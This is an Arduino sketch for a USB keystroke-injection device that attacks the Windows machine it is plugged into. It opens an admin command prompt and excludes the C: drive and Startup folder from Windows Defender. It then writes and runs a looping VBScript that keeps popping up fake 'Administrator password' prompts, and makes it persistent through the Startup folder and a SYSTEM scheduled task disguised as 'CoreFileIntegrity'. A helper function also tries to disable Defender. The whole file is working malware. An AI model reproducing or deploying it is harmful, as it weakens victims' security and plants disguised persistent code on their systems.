#include <Keyboard.h>
void setup()
{
  
  Keyboard.begin();
  delay(2000);

  //windows + d (desktop)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(100);
  Keyboard.releaseAll();
  delay(200);

  //windows + r (run)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();
  delay(300);
  
  Keyboard.print("cmd");
  delay(300);
  Keyboard.press(KEY_LEFT_SHIFT); //open as admin
  Keyboard.press(KEY_LEFT_CTRL);
  typeKey(KEY_RETURN);
  delay(50);
  Keyboard.releaseAll();
  delay(1000);
  typeKey(KEY_LEFT_ARROW);
  delay(100);
  typeKey(KEY_RETURN);
  delay(200);

  //exclude c drive and startup from win.def
  Keyboard.print("powershell -Command Add-MpPreference -ExclusionPath ");
  delay(20);
  Keyboard.print("\'" "C:/" "\'");
  typeKey(KEY_RETURN);
  delay(200);
  Keyboard.print("powershell -Command Add-MpPreference -ExclusionPath ");
  delay(20);
  Keyboard.print("\'" "%USERPROFILE%\\Start Menu\\Programs\\Startup\\" "\'");
  typeKey(KEY_RETURN);
  delay(200);

  //actual vbscript. y/x are positioning variables, t is time until script execution
  Keyboard.print("set copycmd=/y");
  typeKey(KEY_RETURN);
  delay(50);
  Keyboard.print("copy con System.vbs");
  typeKey(KEY_RETURN);
  delay(50);
  Keyboard.print("dim mint, maxt, randt, miny, maxy, randy, minx, maxx, randx");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("minx = 1");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("maxx = 23000");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("miny = 1");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("maxy = 13000");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("mint = 300000");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("maxt = 7200000");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("randomize");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("randt = Int((maxt-mint+1)*Rnd+mint)");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("do until true = false");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("randomize");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("randx = Int((maxx-minx+1)*Rnd+minx)");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("WScript.Sleep randt");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("randomize");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("randy = Int((maxy-miny+1)*Rnd+miny)");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("a = InputBox(" "\"" "Administrator password:" "\"" "," "\"" "System.msg" "\"" ",,randx,randy)");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("CreateObject(" "\"" "WScript.Shell" "\"" ").Run" "\"" "System.vbs" "\"");
  
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.print("loop");
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(122);
  Keyboard.releaseAll();
  typeKey(KEY_RETURN);
  delay(50);


  Keyboard.print("copy System.vbs " "\"" "%USERPROFILE%\\Start Menu\\Programs\\Startup\\" "\"");
  typeKey(KEY_RETURN); 
  delay(50);  

  Keyboard.print("schtasks /create /sc onstart /tn " "\"" "CoreFileIntegrity" "\"" " /tr " "\"" "cscript.exe C:\\Windows\\System32\\System.vbs" "\"" " /ru SYSTEM");
  
  typeKey(KEY_RETURN); 
  delay(50); 
  Keyboard.print("start System.vbs && exit");
  typeKey(KEY_RETURN);
}
void typeKey(int key)
{
  Keyboard.press(key);
  delay(10);
  Keyboard.release(key);
}

void disableWindowsDefender() { //disables win.def. unstable, may not work.
    Keyboard.press(KEY_LEFT_GUI);
  delay(20);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("virus");
  delay(500);
  typeKey(KEY_RETURN);
  delay(200);
  typeKey(KEY_TAB);
  delay(200);
  typeKey(KEY_TAB);
  delay(200);
  typeKey(KEY_TAB);
  delay(200);
  typeKey(KEY_TAB);
  delay(200);
  typeKey(KEY_RETURN);
  delay(200);
  Keyboard.print(" ");
  delay(200);
    typeKey(KEY_LEFT_ARROW);
      delay(200);
  typeKey(KEY_RETURN);
  delay(200);
}

void loop() {}
